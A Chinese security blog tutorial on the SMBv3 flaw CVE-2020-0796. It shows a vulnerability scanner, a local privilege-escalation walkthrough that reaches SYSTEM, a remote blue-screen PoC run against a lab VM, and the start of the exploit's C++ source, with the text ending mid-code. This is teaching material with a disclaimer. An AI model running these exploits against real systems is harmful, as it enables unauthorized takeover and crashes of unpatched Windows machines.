> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yYJXiF3fKjaTDDoKDzKjbA)

娜璋 AI 安全之家于 2020 年 8 月 18 日开通，将专注于 Python 和安全技术，主要分享 Web 渗透、系统安全、CVE 复现、威胁情报分析、人工智能、大数据分析、恶意代码检测等文章。真心想把自己近十年的所学所做所感分享出来，与大家一起进步。

系统安全系列作者将深入研究恶意样本分析、逆向分析、漏洞利用、攻防实战等，通过在线笔记和实践操作的形式分享与博友们学习。前文介绍了 MS08-067 远程代码执行漏洞（CVE-2008-4250），它是 Windows Server 服务 RPC 请求缓冲区溢出漏洞，利用 445 端口，并通过 Metasploit 工具获取 shell 及进行深入的操作。这篇文章将详细讲解 SMBv3 服务远程代码执行漏洞（CVE-2020-0796），攻击者可能利用此漏洞远程无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用的端口仍是 445。基础性文章，希望对您有所帮助，加油！

作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，更希望您能与我一起操作和进步，后续将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！如果文章对您有帮助，将是我创作的最大动力，点赞、评论、私聊均可，一起加油喔~

文章目录：

*   一. 漏洞描述
    
*   二. Win10 本地提权
    
*   三. 虚拟机蓝屏攻击
    
*   四. 漏洞原因分析
    
*   五. 防御措施
    

作者逆向 github 资源：

*   https://github.com/eastmountyxz/SystemSecurity-ReverseAnalysis
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。（参考文献见后）

一. 漏洞描述
=======

基本描述：  
2020 年 3 月 11 日，某国外安全公司发布了一个近期微软安全补丁包所涉及漏洞的综述，其中谈到了一个威胁等级被标记为 Critical 的 SMB 服务远程代码执行漏洞（CVE-2020-0796）。攻击者可能利用此漏洞远程无需用户验证通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDOpMiayaTOba21IsYwDhDQLjdjD17MaYjWcAiaqCrrgvcZ6pVRHEFMwuQ/640?wx_fmt=png)

微软 SMBv3（Server Message Block 3.0）服务远程代码执行漏洞（CVE-2020-0796）可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被 WannaCry 等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office 文档等多种方式触发漏洞进行攻击，对存在该漏洞的 Windows 主机造成严重威胁。

目前奇安信息威胁情报中心红雨滴团队已经确认漏洞的存在，利用此漏洞可以稳定地导致系统崩溃，不排除执行任意代码的可能性，由于漏洞无需用户验证的特性，可能导致类似 WannaCry 攻击那样蠕虫式的传播。2020 年 3 月 12 日微软发布了相应的安全补丁，强烈建议用户立即安装补丁以免受此漏洞导致的风险。2020 年 3 月 14 日，已有可导致受影响系统蓝屏崩溃的漏洞利用 POC 在公开渠道发布，可以稳定地导致系统远程拒绝服务。

3 月 22 日奇安信代码安全团队发布了针对此漏洞的远程无损扫描器，可以帮助网络管理员快速地识别存在此漏洞的系统，欢迎使用。3 月 30 日公开渠道出现利用此漏洞的本地提权利用代码，奇安信验证可用，本地攻击者可以利用漏洞从普通用户权限提升到系统权限。

*   参考： [奇安信威胁情报中心红雨滴团队的分析报告](https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247490831&idx=2&sn=4126b8d0565b1f37b7b4dc3707af4b07&scene=21#wechat_redirect)
    

影响版本：  
该漏洞属于远程代码执行漏洞，漏洞主要影响 Windows10 的系统及应用版本（1903 和 1909），包括 32 位、64 位的家用版、专业版、企业版、教育版。具体如下：

*   Windows 10 Version 1903 for 32-bit Systems
    
*   Windows 10 Version 1903 for ARM64-based Systems
    
*   Windows 10 Version 1903 for x64-based Systems
    
*   Windows 10 Version 1909 for 32-bit Systems
    
*   Windows 10 Version 1909 for ARM64-based Systems
    
*   Windows 10 Version 1909 for x64-based Systems
    
*   Windows Server, version 1903 (Server Core installation)
    
*   Windows Server, version 1909 (Server Core installation)
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDmBHSCkuCkCBbLzBojfHyiceElzguzDuV97YyCiaYib5icG0ZfLsxVAbiaUQ/640?wx_fmt=png)

漏洞原理：  
在微软 SMBv3 远程代码执行漏洞中，SMB 3.1.1 协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。

该漏洞存在于 Windows 的 SMBv3.0（文件共享与打印服务）中，利用的端口是 445。 当 SMBv3.0 处理恶意制作的压缩数据包时，由于 SMB 没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的攻击者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。

漏洞利用：

*   本地 EXP 提权：https://github.com/danigargu/CVE-2020-0796
    
*   SMB 扫描工具：https://github.com/ollypwn/SMBGhost
    
*   POC 蓝屏攻击：https://github.com/eerykitty/CVE-2020-0796-PoC
    
*   Python POC 版本：https://github.com/ZecOps/CVE-2020-0796-LPE-POC
    
*   漏洞检测工具：https://github.com/joaozietolie/CVE-2020-0796-Checker
    
*   作者收集工具：https://github.com/eastmountyxz/CVE-2020-0796-SMB
    

二. Win10 本地提权
=============

第一个实验是利用 CVE-2020-0796 漏洞进行本地提取，攻击者利用该漏洞从普通用户权限提升到系统权限。实验代码采用 C++ 实现，主要执行 EXE 程序。

*   参考代码：https://github.com/danigargu/CVE-2020-0796
    

1. 开启 445 端口
------------

首先需要开启 445 端口。该端口和 135、137、138、139、3389 都是常见的高危端口，大家需要注意防御。作为安全初学者，如果指定端口都未开启或关闭，谈何后续的实验及防御呢？由于作者被该端口困扰了一段时间，所以简单分享一些基础知识，大佬勿喷~

第一步，Windows 查看某个端口是否开启。

*   telnet 127.0.0.1 455  
    显示连接失败
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDDEn0skxaqUiaCc7wnr2yZMewlich5ufRl7icg0V2HPovkTcXhib3ZqzQyw/640?wx_fmt=png)

*   netstat -ano -p tcp | find “445” >nul 2>nul && echo 445 端口已开启 || echo 445 未开启  
    445 端口显示未开启，而 3389 端口显示已开启
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDQdArZUr224VwF8v97OpJA98jtfia1HkSaENlCJjjOUVpfm2DelYKuRg/640?wx_fmt=png)

*   netstat -ano  
    未显示 TCP 开启 445 端口
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD2ibBQ5QDRA8tHmQHw7wYpeE6aniaZicd3eIrJglNpcIXQCfrnkZPt4tBA/640?wx_fmt=png)

第二步，高级安全入站规则设置 445 端口允许。  
点击 “防火墙”->“高级设置”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDvdHWZ2Rn34hLwqUIWUU63AX8jtOqxVBbsgDAVh3ibhshlBQMjBd9L6A/640?wx_fmt=png)

设置 “入站规则”->“新建规则”->“端口” 设置。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDY7icichde7PatNuLhia0OVD85ZMIEmNCBZzrOhAQx9wYYZ8hwkDws3aibQ/640?wx_fmt=png)

设置 TCP 特定端口 445，允许连接和应用所有规则。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDpQvF3TykRsP75TIkL1OZMmdu4Pgs9vnjkIjWtpK267wYjYFAocDCBw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDicicnPa7djrkQRw9L3Rm3yUhm8Rklh73yEDEzcmiaFV2iayABIVIkV18vg/640?wx_fmt=png)

设置成功之后如下图所示，在测试 445 端口是否成功。此时仍然可能显示未开启。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD8fxokwpqShq1MpsTQfJVejxjRVgbrJNbTNhx5Mr61gApmNKIHP5USQ/640?wx_fmt=png)

第三步，注册表中新建 SMBDeviceEnabled 选项。  
在注册表中查看如下路径，发现没有 SMBDeviceEnabled 选项。

> 计算机 \ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDMtXwiczYicBUq4bNcNTqDEgHQTfCBhnEdKqA2MwHynb8NPwK5WmLvsrQ/640?wx_fmt=png)

在右边空白处右击新建 “QWORD（32 位）值”，然后重命名为 “SMBDeviceEnabled”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDHo1t1EQw6KYUcEP8BcujuJOSTD5HoyxjcYevWkicMCQBI7Y4PlyEbwA/640?wx_fmt=png)

再把这个子键的值改为 1。但是作者的 445 端口仍然显示未开启，哎，自己真是菜得抠脚~

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD3YuawgUoMhflpTa7l9dlQrQt2YuGWtoNhIeFpd4zuBXgelDia7G3Z2Q/640?wx_fmt=png)

第四步，启用文件和打印机共享，开启 Server 服务。  
最终原因是 Server 服务未开启。Server 支持计算机通过网络的文件、打印、和命名管道共享。如果服务停止，这些功能不可用。如果服务被禁用，任何直接依赖于此服务的服务将无法启动。

“网络和共享中心”->“高级共享设置”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDHdiaFUbucZmv1ah2icP6hq9FxynvIjsVibsIt7zmiaI6iaFNEU9nWJyJibOA/640?wx_fmt=png)

在运行中输入 “services.msc” 打开服务，开启 Server。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD1Isg0YscA5Skt6nWqDTZnQPW5WEibOdGIwUymnvC8JoMicUWyEgqiah9g/640?wx_fmt=png)

Server 开启后终于成功打开 445 端口。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDUoIOEiaibxEvC74HEcXquZMl7KAHhiagnleicpwuyC9w4WMUlvd1KG1IbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDjBcjPgq9TpOtWIpNy6hKsxNdaTZhBhhBu5iaYI9NOpUT8c1cjWSmH8g/640?wx_fmt=png)

重启计算机显示 445 开启。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDYaF40ic7ZkwKGW00zbIPaPmoUCrstdN4tnqytTlUHiblcLoKS1Z2Yd3w/640?wx_fmt=png)

注意：实验完成之后建议关闭 445 端口，或立刻打补丁。

2.SMBGhost 漏洞扫描
---------------

接着我们尝试用 “https://github.com/ollypwn/SMBGhost” 代码扫描是否存在该漏洞，Win10 注意关闭防火墙。运行结果如下图所示，表示存在 CVE-2020-0796 漏洞。

*   python scanner.py 192.168.0.105
    
*   pip install netaddr 安装扩展包
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDPLghsicg5icZarjhYA1skb5lWpUP8ZEzXib1I4JFD1xAHgtOowlz1BWcw/640?wx_fmt=png)

扫描程序仅用于测试服务器是否易受攻击，它通过协商请求检查 SMBv3.1.1 协议和压缩功能，源代码如下所示。该漏洞主要是由于 SMBv3 协议在处理恶意的压缩数据包时出错所造成的，它可让远程且未经身份验证的攻击者在目标系统上执行任意代码。

scanner.py

```
import socketimport structimport sysfrom netaddr import IPNetworkpkt = b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'subnet = sys.argv[1]#subnet = '192.168.44.141'for ip in IPNetwork(subnet):    sock = socket.socket(socket.AF_INET)    sock.settimeout(3)    try:        sock.connect(( str(ip),  445 ))    except:        sock.close()        continue    sock.send(pkt)    nb, = struct.unpack(">I", sock.recv(4))    res = sock.recv(nb)    if res[68:70] != b"\x11\x03" or res[70:72] != b"\x02\x00":        #print(f"{ip} Not vulnerable.")        print("%s Not vulnerable." % ip)    else:        #print(f"{ip} vulnerable")        print("%s Vulnerable" % ip)
```

3. 本地 EXP 提取
------------

第一步，运行 C++ 代码（sln 程序），生成如下图所示 exe 程序。

*   cve-2020-0796-local.exe
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDvJxicxVbYaCkKZaa7jTkmCgJksf8jl71rpJ2VCLAoQkKNKZYTiaPyRSQ/640?wx_fmt=png)

第二步，在运行中输入 “winver” 命令检查 Windows 版本，必须是 Win10 1903 或 1909。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDibUytiaFSTm9Sia8KwiaFN5gGPia2icic1h3Oj1z7grbGPicerDCMf6HWjluVQ/640?wx_fmt=png)

显示如下图所示，作者的是 1909。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDrs4FUt6iaZZZlkRUEPEFXYtYwQe1uB40NvUdXm2zjChbdcdseFfGIFw/640?wx_fmt=png)

第三步，用管理员权限运行 CMD（命令提示符），输入 “whoami”。

*   输出结果为普通用户权限：desktop-k…86\xxxxxx
    

**![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDdt8FibW3UAwxNQAJlSnjgMEdmM9LEe7V7LNfwIk0s4UI004ia9BYZxdg/640?wx_fmt=png)**

**第四步，用管理员打开 PowerShell，运行 exe 程序提权。  
按下组合键 Windows+R 以打开运行窗口，输入 powershell 会以当前用户的权限去执行。**

**![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDEqGthTKfibiaBnycic7sIMTLt3aoiaQibw5VeykdNx41mJDfDNmYBuHDibSg/640?wx_fmt=png)**

**如果你想要从普通模式转至管理员模式，输入以下 PowerShell 命令然后按下回车键。**

*   **Start-Process powershell -Verb runAs**
    

**![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDOD3fZ3Dr07qyDhFH93kfKOZewzTUYLdpq7dAq9sic9j3WebictkJ0HDg/640?wx_fmt=png)**

**输入如下命令运行 EXE 程序。**

*   **D:**
    
*   **cd D:\SMBGhost-master\CVE-2020-0796**
    
    **-master****\cve-2020-0796-local\x64\Debug**
    
*   **.\cv 按 TAB 键自动补齐 .\cve-2020-0796-local.exe**
    
*   **成功运行程序**
    

**![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD6SjD9vY5jxQBIm3WMtFTkjtp2iceEn8gsMw1jnRcVcOMvqNPIBUzicCg/640?wx_fmt=png)**

**第五步，此时 EXE 成功运行并利用 SMB 漏洞。在 CMD 中输入 “whoami” 命令，可以看到普通用户权限提升至管理员权限。**

*   **普通权限：desktop-k…86\xxxxxx**
    
*   **管理员权限：nt authority\system**
    

**![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDnq7XXhSFT7XSmiazGGKic7pgh52IPmWBZZokZT4mYvLdNgLa8JBpoKDw/640?wx_fmt=png)**

> **系统管理员帐户**：许多服务和 Windows 进程需要在内部登录 （例如在 Windows 安装过程中），系统帐户就是为该目的设计的。它是内部帐户，不显示在用户管理器，也无法添加到任何组，并且不能分配用户权限。默认情况下，系统帐户授予完全控制 NTFS 卷上的所有文件。在此系统帐户具有作为管理员帐户相同的功能权限。  
> **普通管理员账户**：不能够在系统内部登录。对于文件系统，管理员账户和 SYSEM 账户具有相同的权限。但是对于一些服务和进程，我们需要使用系统账户而非管理员账户，因为这些服务和进程要和系统交互，需要内部登录。  
> 在执行计划任务时，如果我们使用 NT AUTHORITY\SYSTEM 账户，那么是不需要输入密码的。但是使用管理员账户，我们必须输入密码。一般使用系统账户是为了防止管理员改变密码后任务无法执行。对于一般的操作，可以使用任何一个账户但还是建议您使用管理员或者普通用户执行。如果和进程或者服务有关的话，可以使用系统账户。

Process Explorer 打开的提权进程如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDddJlKdRkhKCbZUToiaGt3Gx32MQsZcFXBRbRUv9ibZjCZf2FefCp1l3A/640?wx_fmt=png)

自此，本地提权实验成功，实验结束建议关闭 445 端口或完善补丁，切记。C++ 代码及原理将在文章的第四部分详细讲解。

三. 虚拟机蓝屏攻击
==========

1. 环境搭建
-------

*   受害机：Windows 10 1903 64 位专业版
    
*   攻击机：Kali 系统
    

第一步，在虚拟机中安装 Windows 10 系统和 Kali 系统。

*   https://msdn.itellyou.cn/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDAYFLfarndzq86WN1ict6ibgn1DvtLY0ex3xWWCeyPX27mkE2bwrRaVBQ/640?wx_fmt=png)

运行中输入 “winver” 查看版本信息为 1903。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDNiaLx0fwCYymh5tJssXJcPfIQXhPPclpgPcibTdUbwEonrfSKibvD7EnQ/640?wx_fmt=png)

第二步，虚拟机两个系统之间能够相互通信。

*   Kali：192.168.44.138
    
*   Win XP：192.168.44.140
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDY9HtXHqr25HCZBzmEEohNUgjfnXXU5rqTYWpGOSk7vn6VevcoViaEgA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDIy3fPeEUoiasDbd0iaFiaEN7Fz1waFQqibwdWMWoL9AL9RqqVictdTtlN3g/640?wx_fmt=png)

第三步，打开 Windows 10 系统，确定 445 端口开启。如下图所示，在 CMD 中输入 “netstat -ano” 查看端口 445 是否打开。开启方法前面已详细讲解。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDFpuOQcGwwpzBj05cARjwJaVABAVkQn2anKfG66HslRXNka5oYsCysg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDUbQMKz0mVIibfRmurYicjbTUic9FaDHsibe4jxXtuaFKpSL7PclzPVkw7Q/640?wx_fmt=png)

第四步，关闭 Windows 系统的防火墙。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD2QzGh6k2ZI22QVwfjFNzZVOd7ex0kfvUDCcNHicBtWwdTFic90RCcoiag/640?wx_fmt=png)

注意，某些情况系统已打过补丁，还需要删除补丁 KB4551762 才能成功实验。作者也存在一个疑问，采用 Win10 32 位 1903 版本蓝屏攻击总失败，Why？

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDyIKe7ib0X3Y0p3NFHbrgSpVSl6z1ZJic12GibiaIGYQHye89JuRwSV1YXA/640?wx_fmt=png)

删除后重启计算机即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDMUod8deLP9k2RdIg8AicBsJK1u190wCYMVoY3grlq30aTdk6QzNCPrQ/640?wx_fmt=png)

2. 攻击实验
-------

第一步，采用 scanner.py 或 bash 文件扫描该漏洞。这里采用另一种方法，参考资源：https://github.com/joaozietolie/CVE-2020-0796-Checker

*   上传文件至 Kali 系统，作者采用文件共享
    
*   chmod +x CVE-2020-0796-Checker.sh
    
*   bash CVE-2020-0796-Checker.sh -t 192.168.44.140
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDspSU8FhkCgNV2UaLAKDCszmibdKicibicAofnick8NK3jgg182OQfuCOWrw/640?wx_fmt=png)

CVE-2020-0796-Checker.sh

```
#!/bin/bashNC='\033[0m'RED='\033[0;31m'GREEN='\033[0;32m'#Code by João Zietolie :)while getopts "t:" OPTION; do        case "${OPTION}" in         t) target="${OPTARG}";;        esacdone   if [[ "$target" > "0" ]]; then 	echo "Checking for SMB v3.11 in $target ..."	result=$(nmap -p445 --script smb-protocols -Pn -n $target  | grep -o 3.11) 	if [[ "$result" == '3.11' ]]; then                echo -e "$target - ${RED}FOUND 3.11 VERSION - POSSIBLY VULNERABLE TO CVE-2020-0796" ${NC}        else		echo -e "$target - ${GREEN}There is no SMB v3.11 - possibly not vulnerable (Port 445 can be filtered or closed)"  ${NC}	fielse	echo -e "${RED}USAGE: bash CVE-2020-0796-Checker.sh -t IP${NC}"fi
```

第二步，从 github 下载 POC 蓝屏攻击代码至 Kali 系统。

*   https://github.com/eerykitty/CVE-2020-0796-PoC
    
*   命令：git clone https://github.com/eerykitty/CVE-2020-0796-PoC.git
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDPwLoCEYU5aJGGwicqxh9jK0CNofaic7yWa78rwWiclARvCeIMHBw7AXrQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDfcE6kl3E53dQaTQktqSeQ0fmQ9n0ibc9nEjVOBj9IJWc58Z3oBaa8Dw/640?wx_fmt=png)

第三步，安装扩展包并实现 POC 蓝屏攻击。

*   pip install ntlm_auth
    
*   python CVE-2020-0796.py 192.168.44.140
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDicVsuA4iatvrQfDmYdDRYZfTpvVarVYu9olqbERIhvIPeMq5ibeVjcrjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD42LSGS0J2e56pQAQDHK3JUicjCPjOIp1wez9I2YYC46ibZTuc8ic7ZWsg/640?wx_fmt=png)

此时，Win10 系统蓝屏重启，如下图所示。作者又有一个疑问，如何获取 Shell 而不蓝屏呢？

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD7YVc1p0D2NSrLOKWyia32ibWxunQhhhPSAia9C1PQU9llx3movsxN8Oow/640?wx_fmt=png)

四. 漏洞原因分析
=========

根据安全研究人员分析，该漏洞是一个整数溢出，发生在 SMB 服务驱动 srv2.sys 的 Srv2DecompressData 函数中。经过研究，研究人员成功证明了 CVE-2020-0796 漏洞可以被用于本地权限提升。不过需要注意的是，由于 API 的依赖问题，这个 exploit 被限制于中等完整性级别（integrity level）。

> 漏洞成因推荐如下文章：
> 
> - 安全人员发布利用 CVE-2020-0796 实现提权限 PoC
> 
> - CVE-2020-0796 Windows SMBv3 LPE Exploit POC
> 
> - Exploiting SMBGhost (CVE-2020-0796) for a Local Privilege Escalation: Writeup + POC
> 
> - CVE-2020-0796 本地利用简析 - goabout2

1.C++ 代码解析
----------

exploit.cpp

```
/* * CVE-2020-0796 LPE *  * Daniel Garcia Gutierrez (@danigargu) - danigargu[at]gmail.com * Manuel Blanco Parajon (@dialluvioso) - dialluvioso[at]protonmail.com * Date: 03/29/2020 * **/#include <stdio.h>#include <stdint.h>#include <winsock2.h>#include <ws2tcpip.h>#include <windows.h>#include <TlHelp32.h>#include "ntos.h"#pragma comment(lib, "ws2_32.lib")ULONG64 get_handle_addr(HANDLE h) {	ULONG len = 20;	NTSTATUS status = (NTSTATUS)0xc0000004;	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;	do {		len *= 2;		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);	} while (status == (NTSTATUS)0xc0000004);	if (status != (NTSTATUS)0x0) {		printf("NtQuerySystemInformation() failed with error: %#x\n", status);		return 1;	}	DWORD mypid = GetProcessId(GetCurrentProcess());	ULONG64 ptrs[1000] = { 0 };	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {		PVOID object = pHandleInfo->Handles[i].Object;		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;		if (pid != mypid)			continue;		if (handle == (ULONG_PTR)h)			return (ULONG64)object;	}	return -1;}ULONG64 get_process_token() {	HANDLE token;	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());	if (proc == INVALID_HANDLE_VALUE)		return 0;	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);	ULONG64 ktoken = get_handle_addr(token);	return ktoken;}int error_exit(SOCKET sock, const char* msg) {	int err;	if (msg != NULL) {		printf("%s failed with error: %d\n", msg, WSAGetLastError());	}	if ((err = closesocket(sock)) == SOCKET_ERROR) {		printf("closesocket() failed with error: %d\n", WSAGetLastError());	}	WSACleanup();	return EXIT_FAILURE;}int send_negotiation(SOCKET sock) {	int err = 0;	char response[8] = { 0 };	const uint8_t buf[] = {		/* NetBIOS Wrapper */		0x00,                   /* session */		0x00, 0x00, 0xC4,       /* length */		/* SMB Header */		0xFE, 0x53, 0x4D, 0x42, /* protocol id */		0x40, 0x00,             /* structure size, must be 0x40 */		0x00, 0x00,             /* credit charge */		0x00, 0x00,             /* channel sequence */		0x00, 0x00,             /* channel reserved */		0x00, 0x00,             /* command */		0x00, 0x00,             /* credits requested */		0x00, 0x00, 0x00, 0x00, /* flags */		0x00, 0x00, 0x00, 0x00, /* chain offset */		0x00, 0x00, 0x00, 0x00, /* message id */		0x00, 0x00, 0x00, 0x00, 		0x00, 0x00, 0x00, 0x00, /* reserved */		0x00, 0x00, 0x00, 0x00, /* tree id */		0x00, 0x00, 0x00, 0x00, /* session id */		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00, /* signature */		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		/* SMB Negotiation Request */		0x24, 0x00,             /* structure size */		0x08, 0x00,             /* dialect count, 8 */		0x00, 0x00,             /* security mode */		0x00, 0x00,             /* reserved */		0x7F, 0x00, 0x00, 0x00, /* capabilities */		0x01, 0x02, 0xAB, 0xCD, /* guid */		0x01, 0x02, 0xAB, 0xCD,		0x01, 0x02, 0xAB, 0xCD,		0x01, 0x02, 0xAB, 0xCD,		0x78, 0x00,             /* negotiate context */		0x00, 0x00,             /* additional padding */		0x02, 0x00,             /* negotiate context count */		0x00, 0x00,             /* reserved 2 */		0x02, 0x02,             /* dialects, SMB 2.0.2 */		0x10, 0x02,             /* SMB 2.1 */		0x22, 0x02,             /* SMB 2.2.2 */		0x24, 0x02,             /* SMB 2.2.3 */		0x00, 0x03,             /* SMB 3.0 */		0x02, 0x03,             /* SMB 3.0.2 */		0x10, 0x03,             /* SMB 3.0.1 */		0x11, 0x03,             /* SMB 3.1.1 */		0x00, 0x00, 0x00, 0x00, /* padding */		/* Preauth context */		0x01, 0x00,             /* type */		0x26, 0x00,             /* length */		0x00, 0x00, 0x00, 0x00, /* reserved */		0x01, 0x00,             /* hash algorithm count */		0x20, 0x00,             /* salt length */		0x01, 0x00,             /* hash algorith, SHA512 */		0x00, 0x00, 0x00, 0x00, /* salt */		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00, 0x00, 0x00,		0x00, 0x00,             /* pad */		/* Compression context */		0x03, 0x00,             /* 